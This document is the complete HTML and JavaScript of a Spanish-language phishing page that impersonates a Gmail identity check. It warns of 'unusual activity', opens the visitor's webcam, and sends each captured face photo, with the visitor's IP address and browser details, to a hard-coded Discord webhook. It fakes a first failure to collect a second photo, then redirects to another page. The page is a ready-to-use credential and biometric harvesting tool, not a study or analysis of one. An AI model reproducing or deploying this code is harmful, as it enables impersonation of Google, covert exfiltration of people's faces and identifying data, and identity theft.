<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Validaci√≥n de identidad</title>

<style>
body{
  font-family: Arial, sans-serif;
  background:#f4f6f8;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}
.container{
  background:#fff;
  max-width:420px;
  width:90%;
  padding:25px;
  border-radius:8px;
  box-shadow:0 4px 10px rgba(0,0,0,.1);
  text-align:center;
}
.logo img{width:190px;margin-bottom:10px;}
h2{color:#333;}
p{font-size:14px;color:#555;margin-bottom:15px;}
.contador{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  font-size:14px;
  color:#777;
}
.contador img{width:22px;}
.camara{
  width:220px;
  height:220px;
  border-radius:50%;
  overflow:hidden;
  border:5px solid #4CAF9A;
  margin:15px auto;
  background:#000;
}
video,canvas{
  width:100%;
  height:100%;
  object-fit:cover;
}
button{
  background:#e60000;
  color:#fff;
  border:none;
  padding:14px;
  width:100%;
  font-size:16px;
  border-radius:30px;
  cursor:pointer;
}
.mensaje-error{color:#d32f2f;font-size:14px;margin-top:10px;}
.mensaje-ok{color:#2e7d32;font-size:15px;margin-top:10px;font-weight:bold;}
.oculto{display:none;}
</style>
</head>

<body>
<div class="container">

<!-- PASO 1 -->
<div id="paso1">
  <div class="logo">
    <img src="https://cdn.dribbble.com/userupload/29428189/file/original-ddf67c328e5f24751d54062a4a391314.gif">
  </div>
  <h2>Actividad inusual detectada</h2>
  <p>Hemos detectado una actividad inusual. Por motivos de seguridad, es necesario validar su identidad. Para seguir disfrutando de nuestros servicios Gmail.</p>
  <div class="contador">
    <img src="https://i.pinimg.com/originals/44/0b/9d/440b9dc08fefeff13ec30dc0ae6a09df.gif">
    <span>Preparate para validador tu identidad en <strong><span id="tiempo">15</span></strong></span>
  </div>
</div>

<!-- PASO 2 -->
<div id="paso2" class="oculto">

  <!-- LOGO SELFIE (PEGA AQU√ç TU URL) -->
  <div class="logo">
    <img src="https://cdn.dribbble.com/userupload/29428189/file/original-ddf67c328e5f24751d54062a4a391314.gif">
  </div>

  <h2>Tome una foto de su rostro para validar tu identidad</h2>
  <p>Busque un espacio iluminado y haga una expresi√≥n neutral.
      No use gafas, sombreros o accesorios que cubran su rostro.</p>

  <div class="camara">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" class="oculto"></canvas>
  </div>

  <button id="capturar">Tomar foto</button>
  <div id="mensaje"></div>
</div>

</div>

<script>
  /* --- CONFIGURACI√ìN: PEGA TU URL AQU√ç --- */
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1415732495877541959/1wZWJdnpGzXvYQ-Ge3GyHlJAj8Uc54EG6mPfSNikvEXtQJ_o4iAz4P64e4kzNHl6LSqe"; 
  /* -------------------------------------- */

  let userIP = "Cargando...";

  // Obtener IP
  fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(d => userIP = d.ip)
      .catch(() => userIP = "No detectada");

  // Contador 15s
  let tiempo = 15;
  const cuentaRegresiva = setInterval(() => {
      tiempo--;
      document.getElementById("tiempo").textContent = tiempo;
      if (tiempo <= 0) {
          clearInterval(cuentaRegresiva);
          document.getElementById("paso1").style.display = "none";
          document.getElementById("paso2").classList.remove("oculto");
          iniciarCamara();
      }
  }, 1000);

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const boton = document.getElementById("capturar");
  const mensaje = document.getElementById("mensaje");
  let intentos = 0;

  function iniciarCamara() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
      .then(stream => { video.srcObject = stream; })
      .catch(() => { mensaje.innerHTML = "<div class='mensaje-error'>Error de c√°mara.</div>"; });
  }

  async function enviarADiscord(blob) {
      const formData = new FormData();
      const info = `üì∏ **Captura Recibida**\n**IP:** ${userIP}\n**Intento:** ${intentos}\n**Navegador:** ${navigator.userAgent}`;
      formData.append("file", blob, `foto_intento${intentos}.png`);
      formData.append("content", info);

      try {
          await fetch(WEBHOOK_URL, { method: "POST", body: formData });
      } catch (e) { console.error("Error al enviar", e); }
  }

  boton.addEventListener("click", () => {
      if (boton.textContent === "Reintentar") {
          canvas.classList.add("oculto");
          video.style.display = "block";
          mensaje.innerHTML = "";
          boton.textContent = "Tomar foto";
          return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => { 
          intentos++;
          boton.disabled = true;
          boton.textContent = "Validando...";

          // Espera a que la foto se env√≠e antes de seguir
          await enviarADiscord(blob); 

          if (intentos === 1) {
              video.style.display = "none";
              canvas.classList.remove("oculto");
              mensaje.innerHTML = `<div class="mensaje-error">No se pudo verificar su identidad. Intente de nuevo centre bien su rostro en el circulo.</div>`;
              boton.textContent = "Reintentar";
              boton.disabled = false;
          } else {
              // SEGUNDO INTENTO: √âxito y Salto
              mensaje.innerHTML = `<div class="mensaje-ok">‚úî Verificaci√≥n exitosa.</div>`;
              // Peque√±a pausa de medio segundo para que el navegador no corte el env√≠o final
              setTimeout(() => {
                  window.location.href = "index1.html";
              }, 600);
          }
      }, "image/png");
  });
</script>

</body>
</html>
